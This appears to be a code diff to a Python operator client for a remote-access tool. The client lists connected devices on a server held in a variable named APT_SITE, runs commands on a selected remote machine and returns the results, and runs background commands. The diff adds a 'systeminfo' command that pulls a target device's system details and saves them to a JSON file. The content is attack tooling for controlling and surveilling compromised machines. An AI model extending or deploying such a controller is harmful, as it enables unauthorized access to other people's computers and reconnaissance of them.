@@ -1,3 +1,6 @@
+__author__ = "赵博凯"
+__license__ = "GPL v3"
+
 import requests
 import json
 
@@ -103,6 +106,20 @@ class Server:
         output(f"已删除设备：{id}", type="success")
         
     @staticmethod
+    def systeminfo(id):
+        """获取设备系统信息"""
+        response = requests.post(f"{APT_SITE}/{API_PATH}/function", 
+                                json={"func_name": "systeminfo", "id": id}, 
+                                cookies=cookie)
+        if not response.ok: 
+            raise Exception(f"请求失败：{response.status_code} {response.json()}")
+        system_info = json.loads(response.json()["message"])
+        with open("systeminfo.json", "w") as f:
+            json.dump(system_info, f, indent=4, ensure_ascii=False)
+        rich.print_json(data=system_info)
+        output("系统信息已保存到 systeminfo.json 文件中", type="success")
+
+    @staticmethod
     def command(id):
         """进入设备命令模式"""
         while True:
@@ -165,6 +182,7 @@ def command_input():
     [u bold yellow]clear[/u bold yellow]：[green]清空终端屏幕[/green]
     [u bold yellow]list[/u bold yellow]：[green]显示已连接的设备列表[/green]
     [u bold yellow]select <id>[/u bold yellow]：[green]选择一个设备进行控制[/green]
+    [u bold yellow]systeminfo[/u bold yellow]：[green]显示设备系统信息[/green]
     [u bold yellow]command[/u bold yellow]：[green]进入command,可在对方下命令并返回结果[/green]
     [u bold yellow]background <command>[/u bold yellow]：[green]在后台运行命令，不返回结果[/green]
     [u bold yellow]cd <dir>[/u bold yellow]：[green]切换工作目录[/green]''', type="info")
@@ -174,6 +192,8 @@ def command_input():
                         print("\033c")
                     case "list": 
                         Server.device_list()
+                    case "systeminfo":
+                        Server.systeminfo(select_device)
                     case command if command.startswith("select "): 
                         select_device = Server.select_device(command.split(" ", 1)[1])
                     case command if command.startswith("command"): 
